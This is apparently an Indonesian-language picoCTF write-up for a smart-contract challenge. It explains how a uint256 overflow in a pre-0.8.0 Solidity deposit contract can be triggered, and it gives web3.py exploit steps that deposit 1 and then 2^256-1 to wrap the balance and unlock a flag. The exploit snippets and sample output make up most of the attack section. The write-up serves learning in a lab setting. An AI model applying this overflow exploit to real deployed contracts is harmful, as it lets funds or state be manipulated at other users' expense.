# Smart Overflow — picoCTF 2026 Writeup

Category: Blockchain / Smart Contract  
Challenge: Smart Overflow  
Event: picoCTF 2026

---

## Deskripsi Soal

Server menjalankan smart contract sederhana yang mensimulasikan sistem deposit/withdraw. Contract menyimpan saldo internal setiap pengguna dan memiliki fungsi getFlag() yang hanya bisa dipanggil jika kondisi tertentu terpenuhi (field revealed = true).

Tujuan: manipulasi saldo internal contract agar kondisi revealed menjadi true, lalu panggil getFlag().

---

## Vulnerabilitas

### Integer Overflow pada uint256 (Solidity < 0.8.0)

Pada Solidity versi di bawah 0.8.0, operasi aritmatika tidak memiliki proteksi overflow bawaan. Penambahan uint256 yang melampaui 2^256 - 1 akan wrap around kembali ke 0 (seperti modular arithmetic).

Kondisi yang dieksploitasi:

balance + amount  →  overflow  →  hasil < amount  →  FLAG terbuka!

Dengan strategi:

balance = 1
amount  = 2^256 - 1

balance + amount = 1 + (2^256 - 1) = 2^256 ≡ 0 (mod 2^256)
0 < (2^256 - 1)  ✓  → kondisi terpenuhi

---

## Strategi Exploit

### Step 1 — Cek State Awal

Periksa apakah flag sudah terbuka dan saldo internal saat ini:

revealed    = contract.functions.revealed().call()
cur_balance = contract.functions.balances(MY_ADDRESS).call()

Jika revealed sudah True, langsung panggil getFlag().

### Step 2 — Deposit Kecil untuk Set Saldo Awal

Jika saldo masih 0, deposit sejumlah kecil (1 wei) untuk memberikan nilai awal:

send_tx(w3, account, contract.functions.deposit(1))
# cur_balance = 1

### Step 3 — Deposit Overflow Amount

Hitung jumlah yang menyebabkan overflow:

overflow_amount = (2**256 - cur_balance) % (2**256)
# = 2^256 - 1
# balance + overflow_amount = 1 + (2^256 - 1) = 2^256 ≡ 0  ✓

Kirimkan deposit overflow:

send_tx(w3, account, contract.functions.deposit(overflow_amount))

Saldo akan wrap ke 0, memenuhi kondisi contract untuk membuka flag.

### Step 4 — Ambil Flag

Flag bisa diambil dari dua cara — event log atau langsung memanggil getFlag():

# Cara 1: dari event FlagRevealed
logs = contract.events.FlagRevealed().process_receipt(receipt)
flag = logs[0]['args']['flag']

# Cara 2: fallback langsung
flag = contract.functions.getFlag().call()

---

## Cara Pakai

### Install Requirements

pip install web3

### Jalankan Exploit

python3 exploit.py

Pastikan RPC_URL, CONTRACT_ADDR, MY_PRIVKEY, dan MY_ADDRESS sudah disesuaikan dengan instance challenge yang aktif.

---

## Contoh Output

[✓] Connected | Chain ID: 1337 | Block: 42
[✓] ETH balance: 3.0 ETH
[*] revealed = False
[*] My internal balance = 0

[1] Depositing 1 to set initial balance...
    Tx: 0xabc...
    Block 43 | OK ✓
    New balance: 1

[2] Depositing overflow amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935
    = 2^256 - 1
    Expected: balance wraps to 0, which is < amount → FLAG!
    Tx: 0xdef...
    Block 44 | OK ✓

[*] revealed = True

🎉 FLAG: picoCTF{...}

---

## Requirements

| Library | Fungsi |
|---|---|
| web3 | Koneksi ke node Ethereum & interaksi smart contract |

---

## Catatan

> ⚠️ Exploit ini hanya bekerja pada contract yang dikompilasi dengan Solidity < 0.8.0. Sejak versi 0.8.0, overflow/underflow otomatis menyebabkan revert (tidak bisa dieksploitasi tanpa unchecked {}).

> ℹ️ Jika saldo awal sudah > 0 (misalnya dari percobaan sebelumnya), sesuaikan overflow_amount = (2**256 - cur_balance) % (2**256) agar hasil wrap tetap 0.

> ℹ️ Flag bisa muncul di event FlagRevealed pada receipt transaksi, atau bisa langsung dipanggil via getFlag() setelah revealed = true.